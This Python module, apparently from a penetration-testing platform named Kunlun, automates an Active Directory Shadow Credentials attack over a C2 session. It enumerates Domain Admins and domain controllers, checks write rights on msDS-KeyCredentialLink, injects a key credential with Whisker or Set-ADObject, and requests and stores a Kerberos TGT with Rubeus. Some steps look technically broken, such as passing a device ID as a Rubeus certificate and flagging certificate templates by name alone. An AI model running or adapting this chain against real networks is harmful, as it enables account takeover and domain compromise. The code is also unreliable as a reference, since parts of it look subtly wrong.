"""Shadow Credentials attack module for Kunlun penetration testing platform.

Provides:
- AD CS detection and permission checking
- Key Credential injection to target accounts
- TGT acquisition via PKINIT
- Cleanup and rollback support
"""

import asyncio
import logging
import secrets
import time
import uuid
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


class ShadowAttackPhase(Enum):
    """Phase of shadow credentials attack."""
    DETECTION = "detection"
    INJECTION = "injection"
    TGT_REQUEST = "tgt_request"
    CLEANUP = "cleanup"


@dataclass
class KeyCredentialEntry:
    """Key Credential entry in AD object.

    Attributes:
        device_id: Device ID GUID
        key_material: Base64 encoded key material
        key_approximate_last_logon: Last logon timestamp
        key_creation_time: Creation timestamp
        raw_value: Raw msDS-KeyCredentialLink value
    """
    device_id: str = ""
    key_material: str = ""
    key_approximate_last_logon: str = ""
    key_creation_time: str = ""
    raw_value: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        return {
            "device_id": self.device_id,
            "key_material": self.key_material,
            "key_approximate_last_logon": self.key_approximate_last_logon,
            "key_creation_time": self.key_creation_time,
            "raw_value": self.raw_value,
        }


@dataclass
class ShadowTargetInfo:
    """Information about a shadow credentials target.

    Attributes:
        sam_account_name: Account SAM name
        distinguished_name: Distinguished name
        object_sid: Object SID
        object_class: Object class (user/computer)
        has_key_credentials: Whether account has existing key credentials
        key_credentials: Existing key credential entries
        is_high_value: Whether target is high-value
        attackable: Whether target can be attacked
        attackable_reason: Reason for attackability status
        domain: Domain name
    """
    sam_account_name: str = ""
    distinguished_name: str = ""
    object_sid: str = ""
    object_class: str = ""
    has_key_credentials: bool = False
    key_credentials: List[KeyCredentialEntry] = field(default_factory=list)
    is_high_value: bool = False
    attackable: bool = False
    attackable_reason: str = ""
    domain: str = ""


@dataclass
class ShadowAttackResult:
    """Result of shadow credentials attack.

    Attributes:
        success: Whether attack succeeded
        phase: Current attack phase
        target: Target account info
        injected_device_id: Injected device ID
        tgt_ticket: TGT ticket data
        tgt_lifetime: TGT lifetime
        cleanup_available: Whether cleanup is available
        error_message: Error message if failed
        attck_technique: Associated ATT&CK technique ID
        duration_seconds: Operation duration
    """
    success: bool = False
    phase: ShadowAttackPhase = ShadowAttackPhase.DETECTION
    target: Optional[ShadowTargetInfo] = None
    injected_device_id: str = ""
    tgt_ticket: str = ""
    tgt_lifetime: str = ""
    cleanup_available: bool = False
    error_message: str = ""
    attck_technique: str = "T1649"
    duration_seconds: float = 0.0


@dataclass
class ADCSInfo:
    """Active Directory Certificate Services information.

    Attributes:
        is_installed: Whether AD CS is installed
        ca_name: Certificate Authority name
        ca_hostname: CA server hostname
        certificate_templates: Available certificate templates
        vulnerable_templates: Templates vulnerable to ESC attacks
        enrollment_services: Enrollment services
    """
    is_installed: bool = False
    ca_name: str = ""
    ca_hostname: str = ""
    certificate_templates: List[str] = field(default_factory=list)
    vulnerable_templates: List[str] = field(default_factory=list)
    enrollment_services: List[str] = field(default_factory=list)


class ShadowCredentialsAttack:
    """Shadow Credentials attack module.

    Provides target detection, Key Credential injection, TGT acquisition,
    and cleanup/rollback for shadow credentials attack.
    """

    def __init__(
        self,
        c2_session: Optional[Any] = None,
        credential_db: Optional[Any] = None,
        event_bus: Optional[Any] = None,
    ) -> None:
        """Initialize shadow credentials attack module.

        Args:
            c2_session: C2 framework session for command execution.
            credential_db: Credential database for storing results.
            event_bus: Event bus for broadcasting events.
        """
        self.c2_session = c2_session
        self.credential_db = credential_db
        self.event_bus = event_bus
        self._progress_callback: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None
        self._log_callback: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None
        self._injected_targets: Dict[str, str] = {}

    def set_callbacks(
        self,
        progress_cb: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None,
        log_cb: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None,
    ) -> None:
        """Set progress and log callbacks.

        Args:
            progress_cb: Callback for progress updates (message, percentage).
            log_cb: Callback for log messages.
        """
        self._progress_callback = progress_cb
        self._log_callback = log_cb

    async def _report_progress(self, message: str, percentage: float) -> None:
        """Report progress via callback.

        Args:
            message: Progress message.
            percentage: Progress percentage (0-100).
        """
        if self._progress_callback:
            await self._progress_callback(message, percentage)
        logger.info("Shadow Progress: %.1f%% - %s", percentage, message)

    async def _report_log(self, message: str) -> None:
        """Report log via callback.

        Args:
            message: Log message.
        """
        if self._log_callback:
            await self._log_callback(message)
        logger.info("Shadow: %s", message)

    async def _execute_command(self, command: str, target: str = "") -> Dict[str, Any]:
        """Execute command via C2 session.

        Args:
            command: Command to execute.
            target: Target host.

        Returns:
            Command execution result.
        """
        if self.c2_session:
            try:
                result = await self.c2_session.execute(command, target=target)
                return {"success": True, "output": result}
            except Exception as e:
                return {"success": False, "error": str(e)}
        return {"success": False, "error": "No C2 session available"}

    async def detect_adcs(self) -> ADCSInfo:
        """Detect Active Directory Certificate Services.

        Returns:
            ADCSInfo with AD CS configuration.
        """
        adcs_info = ADCSInfo()

        try:
            await self._report_progress("检测AD CS服务", 10)

            cmd = "Get-ADObject -Filter 'objectClass -eq \"pKIEnrollmentService\"' -SearchBase \"CN=Configuration,DC=domain,DC=com\""
            result = await self._execute_command(cmd)

            if result.get("success"):
                output = result.get("output", "")
                if "pKIEnrollmentService" in output:
                    adcs_info.is_installed = True
                    adcs_info.ca_name = self._parse_ca_name(output)
                    adcs_info.ca_hostname = self._parse_ca_hostname(output)
                    adcs_info.enrollment_services = self._parse_enrollment_services(output)

                    await self._report_log(f"检测到AD CS: {adcs_info.ca_name} @ {adcs_info.ca_hostname}")

                    await self._report_progress("检测证书模板", 30)
                    templates = await self._enumerate_certificate_templates()
                    adcs_info.certificate_templates = templates
                    adcs_info.vulnerable_templates = self._find_vulnerable_templates(templates)

                    if adcs_info.vulnerable_templates:
                        await self._report_log(
                            f"发现易受攻击的模板: {', '.join(adcs_info.vulnerable_templates)}"
                        )
                else:
                    await self._report_log("未检测到AD CS服务")
            else:
                await self._report_log("AD CS检测失败")

        except Exception as e:
            logger.error("AD CS detection failed: %s", e)
            await self._report_log(f"AD CS检测异常: {e}")

        return adcs_info

    async def _enumerate_certificate_templates(self) -> List[str]:
        """Enumerate available certificate templates.

        Returns:
            List of certificate template names.
        """
        templates: List[str] = []
        try:
            cmd = (
                "Get-ADObject -Filter 'objectClass -eq \"pKICertificateTemplate\"' "
                "-SearchBase \"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration\""
            )
            result = await self._execute_command(cmd)
            if result.get("success"):
                for line in result.get("output", "").split("\n"):
                    if "CN=" in line:
                        name = line.split("CN=")[1].split(",")[0].strip()
                        templates.append(name)
        except Exception as e:
            logger.error("Failed to enumerate certificate templates: %s", e)
        return templates

    def _find_vulnerable_templates(self, templates: List[str]) -> List[str]:
        """Find certificate templates vulnerable to ESC attacks.

        Args:
            templates: List of template names.

        Returns:
            List of vulnerable template names.
        """
        vulnerable = []
        esc_templates = [
            "ESC1", "ESC2", "ESC3", "ESC4",
            "User", "Machine", "WebServer",
            "SubCA", "CertificateAuthority",
        ]
        for template in templates:
            template_lower = template.lower()
            for esc in esc_templates:
                if esc.lower() in template_lower:
                    vulnerable.append(template)
                    break
        return vulnerable

    def _parse_ca_name(self, output: str) -> str:
        """Parse CA name from command output.

        Args:
            output: Command output.

        Returns:
            CA name.
        """
        for line in output.split("\n"):
            if "name" in line.lower():
                parts = line.split(":")
                if len(parts) >= 2:
                    return parts[1].strip()
        return ""

    def _parse_ca_hostname(self, output: str) -> str:
        """Parse CA hostname from command output.

        Args:
            output: Command output.

        Returns:
            CA hostname.
        """
        for line in output.split("\n"):
            if "dnshostname" in line.lower() or "hostname" in line.lower():
                parts = line.split(":")
                if len(parts) >= 2:
                    return parts[1].strip()
        return ""

    def _parse_enrollment_services(self, output: str) -> List[str]:
        """Parse enrollment services from command output.

        Args:
            output: Command output.

        Returns:
            List of enrollment services.
        """
        services: List[str] = []
        for line in output.split("\n"):
            if "cn=" in line.lower():
                name = line.split("CN=")[1].split(",")[0].strip()
                services.append(name)
        return services

    async def detect_shadow_targets(self) -> List[ShadowTargetInfo]:
        """Detect potential shadow credentials targets.

        Returns:
            List of potential targets with attackability info.
        """
        targets: List[ShadowTargetInfo] = []

        try:
            await self._report_progress("检测Shadow Credentials目标", 5)

            await self._report_log("枚举域管用户...")
            da_users = await self._enumerate_domain_admins()

            await self._report_log("枚举域控计算机账户...")
            dc_computers = await self._enumerate_domain_controllers()

            all_targets = da_users + dc_computers

            for target_info in all_targets:
                target = ShadowTargetInfo(
                    sam_account_name=target_info.get("samAccountName", ""),
                    distinguished_name=target_info.get("distinguishedName", ""),
                    object_sid=target_info.get("objectSid", ""),
                    object_class=target_info.get("objectClass", "user"),
                )

                is_hv, _ = self._is_high_value_target(target.sam_account_name)
                target.is_high_value = is_hv

                key_creds = await self._get_key_credentials(target.distinguished_name)
                target.has_key_credentials = len(key_creds) > 0
                target.key_credentials = key_creds

                can_attack = await self._check_write_key_credential_permission(
                    target.distinguished_name
                )
                target.attackable = can_attack
                if can_attack:
                    target.attackable_reason = "具备Write msDS-KeyCredentialLink权限"
                else:
                    target.attackable_reason = "不具备Write msDS-KeyCredentialLink权限"

                targets.append(target)

            await self._report_progress(
                f"发现 {len(targets)} 个目标, "
                f"{sum(1 for t in targets if t.attackable)} 个可攻击",
                100,
            )

        except Exception as e:
            logger.error("Failed to detect shadow targets: %s", e)
            await self._report_log(f"目标检测失败: {e}")

        return targets

    async def _enumerate_domain_admins(self) -> List[Dict[str, str]]:
        """Enumerate domain admin users.

        Returns:
            List of domain admin user info.
        """
        admins: List[Dict[str, str]] = []
        try:
            cmd = (
                "Get-ADGroupMember -Identity \"Domain Admins\" | "
                "Get-ADUser -Properties *"
            )
            result = await self._execute_command(cmd)
            if result.get("success"):
                output = result.get("output", "")
                for block in output.split("\n\n"):
                    info: Dict[str, str] = {}
                    for line in block.split("\n"):
                        if ":" in line:
                            key, _, value = line.partition(":")
                            info[key.strip()] = value.strip()
                    if info:
                        admins.append(info)
        except Exception as e:
            logger.error("Failed to enumerate domain admins: %s", e)
        return admins

    async def _enumerate_domain_controllers(self) -> List[Dict[str, str]]:
        """Enumerate domain controller computer accounts.

        Returns:
            List of DC computer account info.
        """
        dcs: List[Dict[str, str]] = []
        try:
            cmd = (
                "Get-ADComputer -Filter 'PrimaryGroupID -eq 516' "
                "-Properties *"
            )
            result = await self._execute_command(cmd)
            if result.get("success"):
                output = result.get("output", "")
                for block in output.split("\n\n"):
                    info: Dict[str, str] = {}
                    for line in block.split("\n"):
                        if ":" in line:
                            key, _, value = line.partition(":")
                            info[key.strip()] = value.strip()
                    if info:
                        dcs.append(info)
        except Exception as e:
            logger.error("Failed to enumerate domain controllers: %s", e)
        return dcs

    async def _get_key_credentials(self, distinguished_name: str) -> List[KeyCredentialEntry]:
        """Get existing Key Credential entries for target.

        Args:
            distinguished_name: Target distinguished name.

        Returns:
            List of existing key credential entries.
        """
        entries: List[KeyCredentialEntry] = []
        try:
            cmd = (
                f"Get-ADObject -Identity \"{distinguished_name}\" "
                f"-Properties msDS-KeyCredentialLink"
            )
            result = await self._execute_command(cmd)
            if result.get("success"):
                output = result.get("output", "")
                if "msDS-KeyCredentialLink" in output:
                    for line in output.split("\n"):
                        if "DeviceID" in line or "KeyMaterial" in line:
                            entry = KeyCredentialEntry()
                            if "DeviceID" in line:
                                entry.device_id = line.split(":")[1].strip()
                            if "KeyMaterial" in line:
                                entry.key_material = line.split(":")[1].strip()
                            entries.append(entry)
        except Exception as e:
            logger.error("Failed to get key credentials: %s", e)
        return entries

    async def _check_write_key_credential_permission(
        self,
        distinguished_name: str,
    ) -> bool:
        """Check if current user can write msDS-KeyCredentialLink.

        Args:
            distinguished_name: Target distinguished name.

        Returns:
            True if permission is available.
        """
        try:
            cmd = (
                f"Get-Acl \"AD:{distinguished_name}\" | "
                "Select-Object -ExpandProperty Access | "
                "Where-Object {$_.ActiveDirectoryRights -like '*WriteProperty*' -and "
                "$_.ObjectType -eq '5b47d60f-6090-40b2-9f37-2a4de88f3063'}"
            )
            result = await self._execute_command(cmd)
            success = result.get("success")
            output = result.get("output", "")
            return bool(success) and bool(str(output).strip())
        except Exception:
            return False

    def _is_high_value_target(self, sam_account_name: str) -> Tuple[bool, str]:
        """Check if target is high-value.

        Args:
            sam_account_name: Target SAM account name.

        Returns:
            Tuple of (is_high_value, reason).
        """
        name_lower = sam_account_name.lower()
        if name_lower.endswith("$"):
            return True, "域控计算机账户"
        if name_lower in ["administrator", "admin", "krbtgt"]:
            return True, "高价值内置账户"
        return False, ""

    async def inject_key_credential(
        self,
        target: ShadowTargetInfo,
    ) -> ShadowAttackResult:
        """Inject Key Credential into target account.

        Args:
            target: Target account info.

        Returns:
            ShadowAttackResult with injection status.
        """
        start_time = time.time()
        result = ShadowAttackResult(target=target)

        try:
            await self._report_progress("生成Key Credential", 20)
            await self._report_log(f"开始向 {target.sam_account_name} 注入Key Credential...")

            device_id = str(uuid.uuid4())
            result.injected_device_id = device_id

            await self._report_progress("执行注入", 40)

            inject_cmd = (
                f"whisker add /target:{target.sam_account_name} "
                f"/deviceid:{device_id} /full"
            )
            inject_result = await self._execute_command(inject_cmd)

            if not inject_result.get("success"):
                result.error_message = "Key Credential注入失败"
                result.duration_seconds = time.time() - start_time
                await self._report_log("注入失败，尝试备用方法...")

                await self._report_progress("尝试备用注入方法", 50)
                backup_cmd = (
                    f"Set-ADObject -Identity \"{target.distinguished_name}\" "
                    f"-Add @{{'msDS-KeyCredentialLink'='{device_id}'}}"
                )
                backup_result = await self._execute_command(backup_cmd)
                if not backup_result.get("success"):
                    result.error_message = "所有注入方法均失败"
                    result.duration_seconds = time.time() - start_time
                    return result

            await self._report_progress("请求TGT", 70)
            await self._report_log("Key Credential注入成功，请求TGT...")

            tgt_result = await self._request_tgt(target.sam_account_name, device_id)
            if tgt_result.get("success"):
                result.tgt_ticket = tgt_result.get("ticket", "")
                result.tgt_lifetime = tgt_result.get("lifetime", "10小时")
                result.success = True
                result.phase = ShadowAttackPhase.TGT_REQUEST
                result.cleanup_available = True

                self._injected_targets[target.sam_account_name] = device_id

                await self._report_log(f"TGT获取成功，有效期: {result.tgt_lifetime}")

                if self.credential_db:
                    await self._store_tgt_credential(target, result)
            else:
                result.error_message = "TGT请求失败"
                result.phase = ShadowAttackPhase.INJECTION
                result.cleanup_available = True
                await self._report_log("TGT请求失败，但Key Credential已注入")

            result.duration_seconds = time.time() - start_time

        except Exception as e:
            result.error_message = str(e)
            result.duration_seconds = time.time() - start_time
            await self._report_log(f"Shadow Credentials攻击失败: {e}")
            logger.error("Shadow credentials attack failed: %s", e)

        return result

    async def _request_tgt(self, username: str, device_id: str) -> Dict[str, Any]:
        """Request TGT using injected Key Credential.

        Args:
            username: Target username.
            device_id: Injected device ID.

        Returns:
            TGT request result.
        """
        try:
            cmd = (
                f"Rubeus asktgt /user:{username} "
                f"/certificate:{device_id} /outfile:{username}.kirbi"
            )
            result = await self._execute_command(cmd)
            if result.get("success"):
                output = result.get("output", "")
                ticket = ""
                lifetime = "10小时"
                for line in output.split("\n"):
                    if "Ticket" in line or "Base64" in line:
                        ticket = line.split(":")[1].strip() if ":" in line else line.strip()
                    if "EndTime" in line:
                        lifetime = line.split(":")[1].strip() if ":" in line else lifetime
                return {"success": True, "ticket": ticket, "lifetime": lifetime}
            return {"success": False}
        except Exception as e:
            logger.error("Failed to request TGT: %s", e)
            return {"success": False, "error": str(e)}

    async def _store_tgt_credential(
        self,
        target: ShadowTargetInfo,
        result: ShadowAttackResult,
    ) -> None:
        """Store TGT credential in credential database.

        Args:
            target: Target account info.
            result: Attack result.
        """
        if not self.credential_db:
            return

        try:
            await self.credential_db.add_credential(
                username=target.sam_account_name,
                domain="",
                tgt_ticket=result.tgt_ticket,
                credential_type="kerberos_tgt",
                is_high_value=target.is_high_value,
                source="shadow_credentials",
                device_id=result.injected_device_id,
            )
            await self._report_log("TGT凭据已存入凭据库")
        except Exception as e:
            logger.error("Failed to store TGT credential: %s", e)

    async def cleanup_key_credential(
        self,
        target: ShadowTargetInfo,
    ) -> bool:
        """Clean up injected Key Credential.

        Args:
            target: Target account info.

        Returns:
            True if cleanup successful.
        """
        try:
            await self._report_log(f"清理 {target.sam_account_name} 的Key Credential...")

            device_id = self._injected_targets.get(target.sam_account_name, "")
            if not device_id:
                await self._report_log("未找到注入记录，尝试自动检测...")
                key_creds = await self._get_key_credentials(target.distinguished_name)
                if key_creds:
                    device_id = key_creds[-1].device_id

            if not device_id:
                await self._report_log("无法确定要清理的Key Credential")
                return False

            cleanup_cmd = (
                f"whisker remove /target:{target.sam_account_name} "
                f"/deviceid:{device_id} /full"
            )
            result = await self._execute_command(cleanup_cmd)

            if result.get("success"):
                await self._report_log("Key Credential清理成功")
                self._injected_targets.pop(target.sam_account_name, None)
                return True
            else:
                await self._report_log("清理失败，尝试备用方法")
                backup_cmd = (
                    f"Set-ADObject -Identity \"{target.distinguished_name}\" "
                    f"-Remove @{{'msDS-KeyCredentialLink'='{device_id}'}}"
                )
                backup_result = await self._execute_command(backup_cmd)
                if backup_result.get("success"):
                    await self._report_log("备用清理方法成功")
                    self._injected_targets.pop(target.sam_account_name, None)
                    return True

            return False

        except Exception as e:
            logger.error("Cleanup failed: %s", e)
            await self._report_log(f"清理失败: {e}")
            return False

    async def execute_full_attack(
        self,
        target: ShadowTargetInfo,
        auto_cleanup: bool = False,
    ) -> ShadowAttackResult:
        """Execute full shadow credentials attack chain.

        Args:
            target: Target account info.
            auto_cleanup: Whether to auto cleanup after attack.

        Returns:
            ShadowAttackResult with full attack status.
        """
        await self._report_log(f"开始Shadow Credentials完整攻击: {target.sam_account_name}")

        result = await self.inject_key_credential(target)

        if result.success and auto_cleanup:
            await self._report_log("自动清理模式: 等待5秒后清理...")
            await asyncio.sleep(5)
            cleaned = await self.cleanup_key_credential(target)
            if cleaned:
                result.cleanup_available = False
                await self._report_log("自动清理完成")

        await self._broadcast_event(result, target)

        return result

    async def _broadcast_event(
        self,
        result: ShadowAttackResult,
        target: ShadowTargetInfo,
    ) -> None:
        """Broadcast shadow credentials event.

        Args:
            result: Attack result.
            target: Target info.
        """
        if not self.event_bus:
            return

        try:
            event_data = {
                "event_type": "shadow_credentials_attack",
                "success": result.success,
                "target": target.sam_account_name,
                "device_id": result.injected_device_id,
                "attck_technique": result.attck_technique,
                "timestamp": time.time(),
                "cleanup_available": result.cleanup_available,
            }
            await self.event_bus.publish("domain_attack", event_data)
        except Exception as e:
            logger.error("Failed to broadcast shadow credentials event: %s", e)
